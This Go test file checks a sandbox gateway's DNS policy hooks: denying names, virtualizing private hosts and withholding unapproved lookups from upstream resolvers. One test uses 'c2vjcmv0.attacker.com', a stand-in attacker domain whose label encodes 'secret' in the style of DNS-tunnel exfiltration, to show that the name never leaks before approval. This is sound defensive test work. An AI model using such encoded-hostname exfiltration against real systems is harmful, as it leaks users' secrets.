package gateway

import (
	"bufio"
	"context"
	"errors"
	"log/slog"
	"net"
	"net/netip"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/lukaskoebe/sandbox-studio/internal/dnsproxy"
	"github.com/lukaskoebe/sandbox-studio/internal/store"
)

func TestDNSHooksRefuseAndVirtualize(t *testing.T) {
	pol := &fakePolicy{refused: map[string]store.Rule{"evil.example": {ID: "deny-evil", Action: store.ActionDeny}}}
	conns := &ConnLog{}
	g := &Gateway{
		Policy: pol,
		Conns:  conns,
		Log:    slog.New(slog.DiscardHandler),
		PrivateHosts: func(_ context.Context, envID string) ([]store.PrivateHost, error) {
			switch envID {
			case "env":
				return []store.PrivateHost{{Host: "git.company.local"}}, nil
			case "broken":
				return nil, errors.New("database is closed")
			}
			return nil, nil
		},
	}
	hooks := g.dnsHooks(store.Sandbox{ID: "sb1", EnvironmentID: "env"})

	if !hooks.Deny("evil.example") {
		t.Fatal("a name a deny rule refuses is not refused")
	}
	if hooks.Deny("unknown.example") {
		t.Fatal("a name no rule refuses is refused")
	}
	// A refusal is logged once a minute per name, and says which rule refused it.
	hooks.Deny("evil.example")
	logged := conns.List("sb1")
	if len(logged) != 1 || logged[0].Verdict != VerdictDenied || logged[0].Host != "evil.example" || logged[0].RuleID != "deny-evil" {
		t.Fatalf("connection log: %+v", logged)
	}

	if !hooks.Virtualize("git.company.local") {
		t.Error("a private host's lookups are not virtualized")
	}
	if hooks.Virtualize("other.company.local") {
		t.Error("a name that isn't a private host is virtualized")
	}
	if g.dnsHooks(store.Sandbox{ID: "sb2", EnvironmentID: "other"}).Virtualize("git.company.local") {
		t.Error("another environment's private hosts apply")
	}
	if g.dnsHooks(store.Sandbox{ID: "sb3", EnvironmentID: "broken"}).Virtualize("git.company.local") {
		t.Error("a failed read of the private hosts virtualizes")
	}
}

// A lookup leaves Studio only for a name the policy allows. If the policy can't say, it doesn't.
func TestDNSHooksWithhold(t *testing.T) {
	pol := &fakePolicy{resolvable: map[string]error{"allowed.example": nil, "broken.example": errors.New("database is closed")}}
	conns := &ConnLog{}
	g := &Gateway{Policy: pol, Conns: conns, Log: slog.New(slog.DiscardHandler)}
	hooks := g.dnsHooks(store.Sandbox{ID: "sb1", EnvironmentID: "env"})
	if hooks.Withhold("allowed.example") {
		t.Error("an allowed name is withheld")
	}
	for _, name := range []string{"unknown.example", "broken.example"} {
		if !hooks.Withhold(name) {
			t.Errorf("%s is not withheld", name)
		}
	}

	// A lookup no connection follows from is logged once a minute per name, and a name that
	// couldn't be a host isn't.
	hooks.Withheld("unknown.example", "TXT")
	hooks.Withheld("unknown.example", "TXT")
	hooks.Withheld("no spaces.example", "TXT")
	logged := conns.List("sb1")
	if len(logged) != 1 || logged[0].Host != "unknown.example" || logged[0].Source != "dns" || !strings.Contains(logged[0].Error, "TXT lookup") {
		t.Fatalf("connection log: %+v", logged)
	}
}

// The name a sandbox looks up, with whatever it put in it, reaches no resolver before anything was
// allowed. Once a rule allows the name, the connection goes to the name, not to the virtual address.
func TestWithheldNameIsDialedByName(t *testing.T) {
	const name = "c2vjcmv0.attacker.com"
	h := newHarness(t, "SSH-2.0-test\r\n")

	upstream, err := net.ListenPacket("udp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer upstream.Close()
	var heard atomic.Int32
	go func() {
		buf := make([]byte, 2048)
		for {
			if _, _, err := upstream.ReadFrom(buf); err != nil {
				return
			}
			heard.Add(1)
		}
	}()
	srv, err := dnsproxy.Listen("127.0.0.1:0", []string{upstream.LocalAddr().String()}, nil)
	if err != nil {
		t.Fatal(err)
	}
	defer srv.Close()
	srv.SetHooks(h.gw.dnsHooks(store.Sandbox{ID: "sb1", EnvironmentID: "env"}))
	h.gw.names = func(string) Names { return srv.Names }

	resolver := &net.Resolver{PreferGo: true, Dial: func(ctx context.Context, network, _ string) (net.Conn, error) {
		var d net.Dialer
		return d.DialContext(ctx, network, srv.Addr())
	}}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	addrs, err := resolver.LookupNetIP(ctx, "ip4", name)
	if err != nil || len(addrs) != 1 || !netip.MustParsePrefix("198.18.0.0/15").Contains(addrs[0]) {
		t.Fatalf("lookup: %v, %v", addrs, err)
	}
	if n := heard.Load(); n != 0 {
		t.Fatalf("a resolver heard of the name %d times", n)
	}

	h.policy.mu.Lock()
	h.policy.rules[name] = store.Rule{ID: "approved", Action: store.ActionAllow}
	h.policy.mu.Unlock()
	c, err := h.dial(t, Password([]byte("key"), "sb1"), net.JoinHostPort(addrs[0].String(), "22"))
	if err != nil {
		t.Fatal(err)
	}
	defer c.Close()
	if line, err := bufio.NewReader(c).ReadString('\n'); err != nil || line != "SSH-2.0-test\r\n" {
		t.Fatalf("banner: %q, %v", line, err)
	}
	if got := h.lastDial(); got != name+":22" {
		t.Fatalf("dialed %q", got)
	}
	if n := heard.Load(); n != 0 {
		t.Fatalf("a resolver heard of the name %d times", n)
	}
}
